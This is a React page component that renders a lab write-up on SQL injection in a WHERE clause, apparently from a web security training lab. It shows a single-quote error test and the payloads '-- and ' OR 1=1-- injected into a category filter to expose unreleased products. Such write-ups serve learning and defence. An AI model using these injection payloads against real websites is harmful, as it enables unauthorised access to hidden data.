import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const SQL_1 = () => {
    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                        SQL Injection in WHERE Clause
                    </Typography>
                    <pre>2023/07/22 1:09PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Description
                    </Typography>
                    <Typography>
                        This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
                    </Typography>
                    <Box mt={1}/>
                    <SyntaxHighlighter className="syntax" language="sql">
                        {"SELECT * FROM products WHERE category = 'Gifts' AND released = 1"}
                    </SyntaxHighlighter>
                    <Box mt={1}/>
                    <Typography>
                        To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
                    </Typography>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Getting Started
                    </Typography>
                    <Typography>
                        Once the lab is loaded we are greeted with a shopping website. On the website we can view products and "Refine your search" to filter products. 
                    </Typography>
                    <img src="/sql_1.png" width={1201} height={697} />
                    <Box mt={5}/>
                    <Typography>
                        When filtering by "Pets" the URL will look like so:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"https://0a90009e04d619d180f0851300c30014.web-security-academy.net/filter?category=Pets"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                        From the lab description we can tell that the Pets value is being put into the SQL query like so:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="sql">
                        {"SELECT * FROM products WHERE category = 'Pets' AND released = 1"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Error-Based SQL Injection
                    </Typography>
                    <Typography>
                        We can test for Error-Based SQL injection by simply putting a single quote and checking for a Server Error.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="text">
                        {"https://0a90009e04d619d180f0851300c30014.web-security-academy.net/filter?category=Pets'"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                        We indeed do get a Server Error when injection a single quote.
                    </Typography>
                    <img src="/sql_2.png" width={313} height={154} />
                    <Box mt={5}/>
                    <Typography>
                        We get a Server Error because the SQL syntax will be invalid:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="sql">
                        {"SELECT * FROM products WHERE category = 'Pets'' AND released = 1"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Unreleased Data
                    </Typography>
                    <Typography>
                        To return values in the database that are unreleased, we can comment out the "AND released = 1".
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="sql">
                        {"SELECT * FROM products WHERE category = 'Pets'-- ' AND released = 1"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                        The resulting SQL query returns an unreleased product, but didn't solve the lab for some reason. To return all products, we can inject the following ' OR 1=1--
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="sql">
                        {"SELECT * FROM products WHERE category = 'Pets' OR 1=1-- ' AND released = 1"}
                    </SyntaxHighlighter>
                    <Box pt={25}/>
                </Typography>
            </Container>
        </Box>
    );
};

export default SQL_1;
